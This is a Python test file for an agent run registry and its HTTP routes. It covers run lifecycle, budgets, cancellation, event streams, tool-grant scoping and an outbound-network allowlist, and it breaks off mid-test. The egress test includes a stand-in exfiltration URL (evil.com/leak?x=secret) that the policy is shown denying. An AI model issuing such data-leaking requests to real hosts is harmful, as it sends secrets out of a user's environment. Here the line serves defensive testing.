"""Tests for the agent run registry + /v1/agent/* routes (ADR 0003 Stage 2, Inc 1).

Inc 1 scope: minimal run lifecycle — create/persist/list/get, synchronous
execution. Provider calls are not exercised here (that path is oneshot's,
already tested); these tests cover the registry, the filesystem store, and
the route surface with the provider call bypassed by seeding terminal runs
directly through the registry.
"""

from __future__ import annotations

import json
import tempfile
from pathlib import Path

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from ppxai.engine.agent_runs import (
    AgentRunRegistry,
    FilesystemAgentRunStore,
    RunMeta,
)


@pytest.fixture
def registry(tmp_path: Path) -> AgentRunRegistry:
    return AgentRunRegistry(FilesystemAgentRunStore(tmp_path / "runs"))


# ---------------------------------------------------------------------------
# RunMeta dataclass
# ---------------------------------------------------------------------------


class TestRunMeta:
    def test_roundtrip_to_from_dict(self):
        m = RunMeta(run_id="run_x", task="t", tools=["read_file"], created_at=1.0)
        assert RunMeta.from_dict(m.to_dict()) == m

    def test_from_dict_ignores_unknown_keys(self):
        # Forward-compat read: a newer writer's extra field must not crash an
        # older reader.
        d = {"run_id": "run_x", "task": "t", "future_field": "ignored"}
        m = RunMeta.from_dict(d)
        assert m.run_id == "run_x"
        assert not hasattr(m, "future_field")

    def test_defaults(self):
        m = RunMeta(run_id="r", task="t")
        assert m.status == "pending"
        assert m.agent_n == 0
        assert m.tools == []
        assert m.budget == {}        # Inc 6
        assert m.resumable is False  # Inc 6

    def test_inc6_fields_roundtrip(self):
        m = RunMeta(run_id="r", task="t", budget={"iterations": 3}, resumable=True)
        assert RunMeta.from_dict(m.to_dict()) == m


# ---------------------------------------------------------------------------
# RunControl — cooperative budget/cancel (Inc 6)
# ---------------------------------------------------------------------------


class TestRunControl:
    def _ctl(self, **kw):
        from ppxai.engine.agent_runs import RunControl
        return RunControl(run_id="r", **kw)

    def test_no_budget_never_stops(self):
        c = self._ctl(budget={})
        c.iterations = 1000
        c.check(now=1e9)  # no raise

    def test_iteration_budget_raises_interrupted(self):
        from ppxai.engine.agent_runs import RunBudgetExceeded
        c = self._ctl(budget={"iterations": 2})
        c.iterations = 1
        c.check(now=0.0)            # under cap: ok
        c.iterations = 2
        with pytest.raises(RunBudgetExceeded):
            c.check(now=0.0)        # at cap: stop
        # the exception carries the resumable/interrupted semantics
        assert RunBudgetExceeded("x").status == "interrupted"
        assert RunBudgetExceeded("x").resumable is True

    def test_time_budget_raises(self):
        from ppxai.engine.agent_runs import RunBudgetExceeded
        c = self._ctl(budget={"time_s": 10.0}, started_at=100.0)
        c.check(now=105.0)          # 5s elapsed: ok
        with pytest.raises(RunBudgetExceeded):
            c.check(now=111.0)      # 11s elapsed: stop

    def test_token_budget_raises(self):
        from ppxai.engine.agent_runs import RunBudgetExceeded
        c = self._ctl(budget={"tokens": 100})
        c.tokens_used = 50
        c.check(now=0.0)
        c.tokens_used = 100
        with pytest.raises(RunBudgetExceeded):
            c.check(now=0.0)

    def test_cancel_raises_cancelled(self):
        from ppxai.engine.agent_runs import RunCancelled
        c = self._ctl(budget={})
        c.cancel_requested = True
        with pytest.raises(RunCancelled):
            c.check(now=0.0)
        assert RunCancelled("x").status == "cancelled"
        assert RunCancelled("x").resumable is True

    def test_cancel_takes_precedence_over_budget(self):
        from ppxai.engine.agent_runs import RunCancelled
        c = self._ctl(budget={"iterations": 1})
        c.iterations = 99
        c.cancel_requested = True
        with pytest.raises(RunCancelled):  # cancel checked first
            c.check(now=0.0)


# ---------------------------------------------------------------------------
# Registry + filesystem store
# ---------------------------------------------------------------------------


class TestAgentRunRegistry:
    def test_create_persists_and_returns_meta(self, registry, tmp_path):
        m = registry.start_run("say hi", tools=["read_file"], provider="p", model="m")
        assert m.run_id.startswith("run_")
        assert m.status == "pending"
        assert m.tools == ["read_file"]
        # on disk at the ADR 0005 Triplet path
        assert (tmp_path / "runs" / m.run_id / "agent-0" / "meta.json").exists()

    def test_run_ids_are_unique(self, registry):
        ids = {registry.start_run("t").run_id for _ in range(20)}
        assert len(ids) == 20

    def test_get_run_returns_persisted(self, registry):
        m = registry.start_run("t")
        got = registry.get_run(m.run_id)
        assert got is not None and got.run_id == m.run_id

    def test_get_unknown_returns_none(self, registry):
        assert registry.get_run("run_does_not_exist") is None

    def test_finish_run_marks_terminal(self, registry):
        m = registry.start_run("t")
        registry.finish_run(m, status="completed", result="hello")
        got = registry.get_run(m.run_id)
        assert got.status == "completed"
        assert got.result == "hello"
        assert got.finished_at is not None

    def test_finish_run_records_error(self, registry):
        m = registry.start_run("t")
        registry.finish_run(m, status="failed", error="boom")
        got = registry.get_run(m.run_id)
        assert got.status == "failed" and got.error == "boom"

    def test_list_runs_newest_first(self, registry):
        m1 = registry.start_run("first")
        m2 = registry.start_run("second")
        runs = registry.list_runs()
        assert [r.run_id for r in runs] == [m2.run_id, m1.run_id]

    def test_list_empty_when_no_runs(self, registry):
        assert registry.list_runs() == []

    def test_corrupt_meta_skipped_not_fatal(self, registry, tmp_path):
        m = registry.start_run("good")
        # Plant a corrupt run dir alongside the good one.
        bad = tmp_path / "runs" / "run_corrupt" / "agent-0"
        bad.mkdir(parents=True)
        (bad / "meta.json").write_text("{not json", encoding="utf-8")
        runs = registry.list_runs()
        # good run still listed; corrupt one skipped, no exception
        assert m.run_id in [r.run_id for r in runs]


# ---------------------------------------------------------------------------
# Background execution (Inc 2)
# ---------------------------------------------------------------------------


class TestRunInBackground:
    @pytest.mark.asyncio
    async def test_runs_to_completion(self, registry):
        import asyncio

        m = registry.start_run("t")

        async def runner(meta):
            return "the result"

        registry.run_in_background(m, runner)
        # status flips to running immediately, started_at set
        assert m.status == "running" and m.started_at is not None
        # let the background task finish
        for _ in range(50):
            if registry.get_run(m.run_id).status == "completed":
                break
            await asyncio.sleep(0.01)
        got = registry.get_run(m.run_id)
        assert got.status == "completed" and got.result == "the result"

    @pytest.mark.asyncio
    async def test_runner_exception_marks_failed(self, registry):
        import asyncio

        m = registry.start_run("t")

        async def runner(meta):
            raise RuntimeError("kaboom")

        registry.run_in_background(m, runner)
        for _ in range(50):
            if registry.get_run(m.run_id).status == "failed":
                break
            await asyncio.sleep(0.01)
        got = registry.get_run(m.run_id)
        assert got.status == "failed" and "kaboom" in got.error

    @pytest.mark.asyncio
    async def test_cooperative_cancel_marks_cancelled(self, registry):
        # Inc 6: a runner that polls control.check() between steps stops
        # cooperatively when cancel_run flips the flag — status=cancelled,
        # resumable=True, and the stop lands at the checkpoint (not mid-step).
        import asyncio

        m = registry.start_run("t")
        steps_done = []

        async def runner(meta):
            ctl = registry.get_control(meta.run_id)
            for i in range(100):
                ctl.check(now=0.0)        # checkpoint — raises RunCancelled
                steps_done.append(i)
                await asyncio.sleep(0.01)
            return "never reached"

        registry.run_in_background(m, runner)
        await asyncio.sleep(0.03)          # let a couple steps run
        assert registry.cancel_run(m.run_id) is True
        for _ in range(100):
            if registry.get_run(m.run_id).status in ("cancelled", "failed"):
                break
            await asyncio.sleep(0.01)
        got = registry.get_run(m.run_id)
        assert got.status == "cancelled"   # not failed
        assert got.resumable is True
        assert len(steps_done) < 100       # stopped early, at a checkpoint
        # control is cleaned up after the run finishes
        assert registry.get_control(m.run_id) is None

    def test_cancel_unknown_run_returns_false(self, registry):
        assert registry.cancel_run("run_does_not_exist") is False

    @pytest.mark.asyncio
    async def test_cancel_cascades_to_child(self, registry):
        # Item 37e / secondary review: cancelling a parent must cascade to its
        # in-flight children so a sub-agent isn't orphaned (kept consuming
        # budget/LLM calls) when its parent is cancelled. The cascade is a
        # registry invariant, independent of whether anyone is polling in
        # _await_child.
        import asyncio

        parent = registry.start_run("parent")

        async def runner(meta):
            ctl = registry.get_control(meta.run_id)
            for _ in range(200):
                ctl.check(now=0.0)
                await asyncio.sleep(0.01)
            return "never"

        registry.run_in_background(parent, runner)
        # Child linked to the parent, also in-flight.
        child = registry.start_run("child", parent_run_id=parent.run_id)
        registry.run_in_background(child, runner)
        await asyncio.sleep(0.03)

        # Cancel ONLY the parent — the child must be cancelled too.
        assert registry.cancel_run(parent.run_id) is True
        for _ in range(200):
            cs = registry.get_run(child.run_id).status
            ps = registry.get_run(parent.run_id).status
            if cs in ("cancelled", "failed") and ps in ("cancelled", "failed"):
                break
            await asyncio.sleep(0.01)
        assert registry.get_run(parent.run_id).status == "cancelled"
        assert registry.get_run(child.run_id).status == "cancelled"  # cascaded

    def test_cancel_not_in_flight_returns_false(self, registry):
        # Cascade over a run with no registered control (never backgrounded)
        # returns False and the child-scan doesn't raise.
        m = registry.start_run("solo")
        assert registry.cancel_run(m.run_id) is False


# ---------------------------------------------------------------------------
# Run events (Inc 3) — emit, persist, filter
# ---------------------------------------------------------------------------


class TestRunEvents:
    def test_emit_persists_and_assigns_seq(self, registry):
        m = registry.start_run("t")
        e1 = registry.emit_event(m.run_id, "a", level="info", category="lifecycle")
        e2 = registry.emit_event(m.run_id, "b", level="debug", category="tool")
        assert (e1.seq, e2.seq) == (1, 2)
        evs = registry.read_events(m.run_id)
        assert [e.type for e in evs] == ["a", "b"]

    def test_since_cursor(self, registry):
        m = registry.start_run("t")
        for i in range(3):
            registry.emit_event(m.run_id, f"e{i}")
        assert [e.seq for e in registry.read_events(m.run_id, since=1)] == [2, 3]

    def test_min_level_filter(self, registry):
        m = registry.start_run("t")
        registry.emit_event(m.run_id, "dbg", level="debug")
        registry.emit_event(m.run_id, "err", level="error")
        got = registry.read_events(m.run_id, min_level="warning")
        assert [e.type for e in got] == ["err"]

    def test_category_filter(self, registry):
        m = registry.start_run("t")
        registry.emit_event(m.run_id, "t1", category="tool")
        registry.emit_event(m.run_id, "l1", category="lifecycle")
        got = registry.read_events(m.run_id, categories={"tool"})
        assert [e.type for e in got] == ["t1"]

    def test_seq_seeds_from_disk_on_fresh_registry(self, registry, tmp_path):
        # A fresh registry over the same store must not restart seq at 1.
        m = registry.start_run("t")
        registry.emit_event(m.run_id, "a")
        registry.emit_event(m.run_id, "b")
        fresh = AgentRunRegistry(FilesystemAgentRunStore(tmp_path / "runs"))
        e = fresh.emit_event(m.run_id, "c")
        assert e.seq == 3  # continues, doesn't collide

    @pytest.mark.asyncio
    async def test_subscribe_then_snapshot_no_lost_event(self, registry):
        # Lost-event race guard (codex HIGH): if a client subscribes, then
        # an event is emitted, then the backlog is snapshotted, the event
        # must be delivered exactly once — via the queue, deduped against
        # the backlog by seq. Models the SSE handler's ordering.
        m = registry.start_run("t")
        registry.emit_event(m.run_id, "e1")  # pre-existing backlog

        q = registry.subscribe(m.run_id)          # 1. subscribe FIRST
        registry.emit_event(m.run_id, "e2")       # 2. emit in the race window
        backlog = registry.read_events(m.run_id)  # 3. snapshot AFTER subscribe

        # backlog may or may not include e2 depending on timing; the queue
        # definitely has it. Simulate the handler: send backlog, then drain
        # queue with seq-dedup.
        sent = []
        last_seq = 0
        for ev in backlog:
            last_seq = max(last_seq, ev.seq)
            sent.append(ev.type)
        # drain whatever the queue holds without blocking
        while not q.empty():
            ev = q.get_nowait()
            if ev.seq <= last_seq:
                continue
            last_seq = ev.seq
            sent.append(ev.type)
        registry.unsubscribe(m.run_id, q)
        # e2 delivered exactly once, e1 once — neither lost nor duplicated
        assert sent.count("e2") == 1
        assert sent.count("e1") == 1

    @pytest.mark.asyncio
    async def test_overflow_sets_flag_not_silent_drop(self, registry):
        # Slow-consumer overflow (codex MEDIUM): when a subscriber's queue
        # fills, emit_event must NOT silently drop — it flags the queue
        # _ppxai_overflowed so the SSE generator can self-heal from disk.
        m = registry.start_run("t")
        q = registry.subscribe(m.run_id)
        # fill the queue past maxsize so the next emit overflows it
        for i in range(q.maxsize + 5):
            registry.emit_event(m.run_id, f"e{i}")
        assert getattr(q, "_ppxai_overflowed", False) is True
        # ALL events are still on disk — nothing lost; the generator would
        # replay from disk via read_events(since=last_seq).
        on_disk = registry.read_events(m.run_id)
        assert len(on_disk) == q.maxsize + 5
        registry.unsubscribe(m.run_id, q)

    def test_torn_last_line_skipped(self, registry, tmp_path):
        m = registry.start_run("t")
        registry.emit_event(m.run_id, "good")
        path = tmp_path / "runs" / m.run_id / "agent-0" / "events.jsonl"
        with path.open("a", encoding="utf-8") as f:
            f.write('{"seq": 2, "ts": 1, "typ')  # torn write (crash mid-append)
        evs = registry.read_events(m.run_id)
        assert [e.type for e in evs] == ["good"]  # torn line skipped, not fatal


# ---------------------------------------------------------------------------
# /v1/agent/* routes (provider call bypassed)
# ---------------------------------------------------------------------------


@pytest.fixture
def client(tmp_path, monkeypatch):
    import ppxai.server.state as state
    from ppxai.server.routes import agent_v1

    reg = AgentRunRegistry(FilesystemAgentRunStore(tmp_path / "runs"))
    monkeypatch.setattr(state, "_agent_run_registry", reg)

    app = FastAPI()
    app.include_router(agent_v1.router)
    return TestClient(app), reg


class TestAgentConfig:
    """get_agent_config must SURFACE spawn_consent (Inc 7).

    Regression guard: get_agent_config() whitelists keys, so a new agent
    config key that isn't added to the whitelist silently reads as None even
    when present in ppxai-config.json — which is exactly how spawn_consent
    was dead-on-arrival until the whitelist was updated."""

    def test_spawn_consent_defaults_deny(self, monkeypatch):
        from ppxai.config import tools as tools_cfg
        monkeypatch.setattr(tools_cfg, "get_tool_config", lambda name: {})
        assert tools_cfg.get_agent_config()["spawn_consent"] == "deny"

    def test_spawn_consent_reads_auto_from_config(self, monkeypatch):
        from ppxai.config import tools as tools_cfg
        monkeypatch.setattr(
            tools_cfg, "get_tool_config", lambda name: {"spawn_consent": "auto"}
        )
        assert tools_cfg.get_agent_config()["spawn_consent"] == "auto"


class TestAgentRunRoutes:
    def test_list_empty(self, client):
        c, _ = client
        assert c.get("/v1/agent/runs").json() == {"runs": []}

    def test_get_unknown_404(self, client):
        c, _ = client
        assert c.get("/v1/agent/runs/run_nope").status_code == 404

    def test_seeded_run_lists_and_fetches(self, client):
        c, reg = client
        m = reg.start_run("manual", tools=["read_file"], provider="p", model="m")
        reg.finish_run(m, status="completed", result="hi")

        listed = c.get("/v1/agent/runs").json()["runs"]
        assert [r["run_id"] for r in listed] == [m.run_id]
        assert listed[0]["tools"] == ["read_file"]

        one = c.get(f"/v1/agent/runs/{m.run_id}").json()
        assert one["status"] == "completed"
        assert one["result"] == "hi"

    @staticmethod
    def _fake_provider():
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _FakeProvider(OpenAICompatibleProvider):
            def __init__(self):  # bypass real provider construction
                pass

            def oneshot(self, *, prompt, model, system=None, **kw):
                return {"content": f"echo: {prompt}", "finish_reason": "stop"}

        return _FakeProvider()

    _TERMINAL = ("completed", "failed", "cancelled", "interrupted")

    @classmethod
    def _poll_terminal(cls, c, run_id, timeout_s=5.0):
        """Poll GET until the run reaches a terminal status (Inc 2 is async).
        Terminal set grew in Inc 6 to include cancelled/interrupted."""
        import time as _t

        deadline = _t.monotonic() + timeout_s
        while _t.monotonic() < deadline:
            one = c.get(f"/v1/agent/runs/{run_id}").json()
            if one["status"] in cls._TERMINAL:
                return one
            _t.sleep(0.02)
        raise AssertionError(f"run {run_id} did not finish: last={one}")

    def test_no_provider_no_default_400(self, client, monkeypatch):
        # No provider in request AND no tools.agent.default_subagent -> 400,
        # no run created. (Resolution: request -> config -> 400. Session chat
        # provider is intentionally NOT consulted.)
        c, reg = client
        from ppxai.server.routes import agent_v1
        monkeypatch.setattr(agent_v1, "get_agent_config", lambda: {"default_subagent": {}})
        resp = c.post("/v1/agent/run", json={"task": "t"})
        assert resp.status_code == 400
        assert "provider" in resp.json()["detail"].lower()
        assert reg.list_runs() == []

    def test_explicit_provider_model_in_request(self, client, monkeypatch):
        # The contract path: provider/model passed explicitly per run (what
        # spawn_subagent always does). Completes with result + records them.
        c, reg = client
        from ppxai.server.routes import agent_v1

        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: self._fake_provider())

        resp = c.post("/v1/agent/run", json={
            "task": "ping", "tools": ["read_file"],
            "provider": "fakeprov", "model": "fakemodel",
        })
        assert resp.status_code == 200
        assert resp.json()["status"] == "running"
        one = self._poll_terminal(c, resp.json()["run_id"])
        assert one["status"] == "completed"
        assert one["result"] == "echo: ping"
        assert one["tools"] == ["read_file"]
        assert one["provider"] == "fakeprov" and one["model"] == "fakemodel"
        assert one["started_at"] is not None

    def test_falls_back_to_default_subagent_config(self, client, monkeypatch):
        # No provider/model in request -> resolves from
        # tools.agent.default_subagent (NOT the session chat provider).
        c, reg = client
        from ppxai.server.routes import agent_v1

        monkeypatch.setattr(
            agent_v1, "get_agent_config",
            lambda: {"default_subagent": {"provider": "cfgprov", "model": "cfgmodel"}},
        )
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: self._fake_provider())

        resp = c.post("/v1/agent/run", json={"task": "ping"})
        assert resp.status_code == 200
        one = self._poll_terminal(c, resp.json()["run_id"])
        assert one["status"] == "completed"
        assert one["provider"] == "cfgprov" and one["model"] == "cfgmodel"

    def test_provider_failure_marks_run_failed(self, client, monkeypatch):
        # If the background LLM call raises, the run ends 'failed' (not lost).
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _BoomProvider(OpenAICompatibleProvider):
            def __init__(self):
                pass

            def oneshot(self, *, prompt, model, system=None, **kw):
                raise RuntimeError("upstream 503")

        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _BoomProvider())

        resp = c.post("/v1/agent/run", json={
            "task": "ping", "provider": "fakeprov", "model": "fakemodel",
        })
        assert resp.status_code == 200
        assert resp.json()["status"] == "running"
        one = self._poll_terminal(c, resp.json()["run_id"])
        assert one["status"] == "failed"
        assert "upstream 503" in one["error"]

    def test_unbuildable_provider_400_no_run_created(self, client, monkeypatch):
        # v1.19.x: the v1 tier is provider-AGNOSTIC (gates by capability, not
        # class). The only up-front 400 is an UNBUILDABLE provider — unknown
        # name / missing key — which _build_provider raises BEFORE minting, so
        # no orphan run is created.
        c, reg = client
        from fastapi import HTTPException
        from ppxai.server.routes import agent_v1

        def _raise(name):
            raise HTTPException(status_code=400, detail=f"unknown provider {name!r}")
        monkeypatch.setattr(agent_v1, "_build_provider", _raise)

        resp = c.post("/v1/agent/run", json={
            "task": "ping", "provider": "fakeprov", "model": "fakemodel",
        })
        assert resp.status_code == 400
        assert reg.list_runs() == []  # no orphan run

    def test_events_endpoint_replay_and_filters(self, client):
        # Inc 3: GET .../events (non-live JSON) replays persisted events,
        # honoring ?since= / ?min_level= / ?category=.
        c, reg = client
        m = reg.start_run("t", provider="p", model="m")
        reg.emit_event(m.run_id, "dbg", level="debug", category="tool")
        reg.emit_event(m.run_id, "err", level="error", category="lifecycle")

        rid = m.run_id
        allev = c.get(f"/v1/agent/runs/{rid}/events").json()["events"]
        assert [e["type"] for e in allev] == ["dbg", "err"]
        # filters
        warn = c.get(f"/v1/agent/runs/{rid}/events?min_level=warning").json()["events"]
        assert [e["type"] for e in warn] == ["err"]
        tool = c.get(f"/v1/agent/runs/{rid}/events?category=tool").json()["events"]
        assert [e["type"] for e in tool] == ["dbg"]
        since = c.get(f"/v1/agent/runs/{rid}/events?since=1").json()["events"]
        assert [e["seq"] for e in since] == [2]
        # each record carries the two filter axes
        assert allev[0]["level"] == "debug" and allev[0]["category"] == "tool"

    def test_events_unknown_run_404(self, client):
        c, _ = client
        assert c.get("/v1/agent/runs/run_nope/events").status_code == 404

    def test_task_requires_nonempty_grant(self, client):
        # /v1/agent/task is the tool-capable tier: the grant is required +
        # non-empty (pydantic min_length=1 -> 422), so it can never run
        # tool-free by accident.
        c, _ = client
        assert c.post("/v1/agent/task", json={
            "task": "t", "tools": [], "provider": "p", "model": "m",
        }).status_code == 422
        assert c.post("/v1/agent/task", json={
            "task": "t", "provider": "p", "model": "m",
        }).status_code == 422

    def test_task_rejects_shell_grant(self, client):
        # AC-2 (security review High): a shell tool escapes the egress
        # allowlist (arbitrary curl/pip/etc.), so a /task grant containing it
        # is rejected up front with a clear 400 — not silently never run.
        c, _ = client
        r = c.post("/v1/agent/task", json={
            "task": "t", "tools": ["read_file", "execute_shell_command"],
            "provider": "p", "model": "m",
        })
        assert r.status_code == 400
        assert "execute_shell_command" in r.json()["detail"]

    def test_task_accepts_any_buildable_provider(self, client, monkeypatch):
        # v1.19.x: /task drives engine.chat() (abstract on BaseProvider — every
        # provider has it), so the tier no longer rejects native
        # openai/gemini/perplexity by class. A buildable provider is accepted;
        # the run is minted and backgrounded (it then fails only because the
        # stub engine isn't real — but the POST must NOT 400 on provider class).
        c, reg = client
        from ppxai.server.routes import agent_v1

        class _AnyProvider:  # NOT an OpenAICompatibleProvider — must still pass
            pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _AnyProvider())

        # Make the background runner a no-op so we isolate the route's accept
        # decision (no real EngineClient needed).
        async def _ok_runner(m):
            return "ok"
        monkeypatch.setattr(
            agent_v1, "build_task_runner", lambda reg_, **kw: _ok_runner,
        )

        r = c.post("/v1/agent/task", json={
            "task": "t", "tools": ["read_file"], "provider": "openai", "model": "m",
        })
        assert r.status_code == 200          # accepted, not 400-by-class
        assert r.json()["status"] in ("running", "completed")
        assert len(reg.list_runs()) == 1     # run was minted

    def test_task_enforces_grant_end_to_end(self, client, monkeypatch):
        # Full /task path with EngineClient stubbed: the stubbed chat() calls
        # the (route-installed) ScopedToolManager.execute_tool on an off-grant
        # tool. AC-1: it's denied, base never runs it, a tool_denied event
        # lands on the run stream, and the run still completes.
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine.types import Event, EventType

        # Bypass provider build (it's OpenAI-compat-checked before backgrounding).
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())

        # Stub EngineClient: enable_tools no-op; chat() drives one off-grant
        # execute_tool through whatever tool_manager the route installed, then
        # ends. tool_manager is set to a real base so Scoped wraps something.
        from ppxai.engine.agent_scoped_tools import ScopedToolManager

        class _BaseTM:
            def __init__(self): self.ran = []
            async def execute_tool(self, name, **kw): self.ran.append(name); return "ran"
            max_iterations = 3

        class _StubEngine:
            def __init__(self): self.tool_manager = _BaseTM()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                # the route wrapped self.tool_manager in ScopedToolManager;
                # call a granted tool (emits tool_call with the real
                # data={"tool": ...} shape), attempt an off-grant tool
                # (denied), then finish with STREAM_END as a plain string.
                yield Event(type=EventType.TOOL_CALL, data={"tool": "read_file"})
                await self.tool_manager.execute_tool("write_file", path="x")
                yield Event(type=EventType.STREAM_END, data="done")

        stub = _StubEngine()
        monkeypatch.setattr(agent_v1, "EngineClient", lambda: stub, raising=False)
        # the route imports EngineClient inside _runner; patch the source module
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)

        resp = c.post("/v1/agent/task", json={
            "task": "do it", "tools": ["read_file"],  # write_file NOT granted
            "provider": "p", "model": "m",
        })
        assert resp.status_code == 200
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "completed"
        assert one["result"] == "done"
        # AC-1: the off-grant tool was denied — base never ran it
        assert isinstance(stub.tool_manager, ScopedToolManager)
        assert stub.tool_manager._base.ran == []  # write_file never executed
        # tool events on the stream: a labeled tool_call (name captured from
        # event.data["tool"], not empty) AND the tool_denied.
        evs = c.get(f"/v1/agent/runs/{rid}/events?category=tool").json()["events"]
        assert any(e["type"] == "tool_denied" for e in evs)
        call = next((e for e in evs if e["type"] == "tool_call"), None)
        assert call is not None and call["data"]["tool"] == "read_file"  # name not empty

    def test_task_enforces_egress_end_to_end(self, client, monkeypatch):
        # AC-2: full /task path with a network spec. The stubbed chat() drives
        # a granted network tool (fetch_url) at an OFF-allowlist host through
        # the route-installed ScopedToolManager. The egress check denies it,
        # the base never runs it, a network_policy_denied event lands on the
        # 'network' channel, and the run still completes. Then a granted host
        # is allowed and emits network_policy_allowed.
        c, _reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine.types import Event, EventType
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider
        from ppxai.engine.agent_scoped_tools import ScopedToolManager

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())

        class _BaseTM:
            max_iterations = 3
            def __init__(self): self.ran = []
            async def execute_tool(self, name, **kw):
                self.ran.append((name, kw)); return "fetched"

        class _StubEngine:
            def __init__(self): self.tool_manager = _BaseTM()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                # one denied (evil.com), one allowed (api.github.com)
                await self.tool_manager.execute_tool(
                    "fetch_url", url="https://evil.com/leak?x=secret")
                await self.tool_manager.execute_tool(
                    "fetch_url", url="https://api.github.com/repos/x")
                yield Event(type=EventType.STREAM_END, data="done")

        stub = _StubEngine()
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)

        resp = c.post("/v1/agent/task", json={
            "task": "research", "tools": ["fetch_url"],
            "provider": "p", "model": "m",
            "network": {"allow_outbound": ["api.github.com"]},
        })
        assert resp.status_code == 200
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "completed"
        # the allowlist persisted on the run meta (provenance/audit)
        assert one["network"] == ["api.github.com"]
        # AC-2: evil.com NEVER fetched; only the allowed host ran
        assert isinstance(stub.tool_manager, ScopedToolManager)
        assert stub.tool_manager._base.ran == [
            ("fetch_url", {"url": "https://api.github.com/repos/x"})
        ]
        # both decisions on the 'network' channel
        evs = c.get(f"/v1/agent/runs/{rid}/events?category=network").json()["events"]
        denied = next((e for e in evs if e["type"] == "network_policy_denied"), None)
        allowed = next((e for e in evs if e["type"] == "network_policy_allowed"), None)
        assert denied is not None and denied["data"]["target_host"] == "evil.com"
        assert denied["data"]["allowlist_rule_id"] is None
        assert allowed is not None and allowed["data"]["target_host"] == "api.github.com"
        assert allowed["data"]["run_id"] == rid

    def test_task_provider_error_fails_run(self, client, monkeypatch):
        # codex MEDIUM: the engine reports provider/config failures as
        # EVENTS (EventType.ERROR / PROVIDER_THROTTLED), not exceptions —
        # chat() yields one and returns normally. The runner must turn that
        # into a FAILED run, not a clean completed-empty run (which would
        # silently mask provider outages as successful empty answers).
        c, _reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine.types import Event, EventType
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())

        class _BaseTM:
            max_iterations = 3
            async def execute_tool(self, name, **kw): return "ran"

        class _StubEngine:
            def __init__(self): self.tool_manager = _BaseTM()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                # provider blew up mid-call — engine surfaces it as an event
                yield Event(
                    type=EventType.ERROR,
                    data={"message": "upstream 500 from provider"},
                )

        stub = _StubEngine()
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)

        resp = c.post("/v1/agent/task", json={
            "task": "do it", "tools": ["read_file"],
            "provider": "p", "model": "m",
        })
        assert resp.status_code == 200
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "failed"  # NOT completed
        assert "upstream 500 from provider" in (one["error"] or "")
        # and the failure is on the event stream as an error-level event
        evs = c.get(f"/v1/agent/runs/{rid}/events").json()["events"]
        assert any(e["type"] == "agent_run_error" for e in evs)

    def _budget_stub_engine(self, n_tool_calls):
        """An engine stub whose chat() emits n TOOL_CALL events then ends."""
        from ppxai.engine.types import Event, EventType

        class _BaseTM:
            max_iterations = 99
            async def execute_tool(self, name, **kw): return "ran"

        class _StubEngine:
            def __init__(self): self.tool_manager = _BaseTM()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                for _ in range(n_tool_calls):
                    yield Event(type=EventType.TOOL_CALL, data={"tool": "read_file"})
                yield Event(type=EventType.STREAM_END, data="done")

        return _StubEngine()

    def test_task_iteration_budget_interrupts(self, client, monkeypatch):
        # Inc 6: a run that exceeds its iteration budget stops at a clean
        # checkpoint with status=interrupted + resumable=True (NOT failed).
        c, _reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())

        stub = self._budget_stub_engine(n_tool_calls=5)  # would do 5 iterations
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)

        resp = c.post("/v1/agent/task", json={
            "task": "loop", "tools": ["read_file"],
            "provider": "p", "model": "m",
            "budget": {"iterations": 2},  # cap below the 5 the stub would do
        })
        assert resp.status_code == 200
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "interrupted"   # not failed, not completed
        assert one["resumable"] is True
        assert one["budget"] == {"iterations": 2}  # persisted
        # only the budgeted number of tool_calls were surfaced before the stop
        tool_evs = c.get(f"/v1/agent/runs/{rid}/events?category=tool").json()["events"]
        assert len([e for e in tool_evs if e["type"] == "tool_call"]) == 2
        # the interrupt is on the lifecycle stream
        life = c.get(f"/v1/agent/runs/{rid}/events?category=lifecycle").json()["events"]
        assert any(e["type"] == "agent_run_interrupted" for e in life)

    def test_no_budget_runs_to_completion(self, client, monkeypatch):
        # control: same stub, no budget -> all iterations run, completes.
        c, _reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

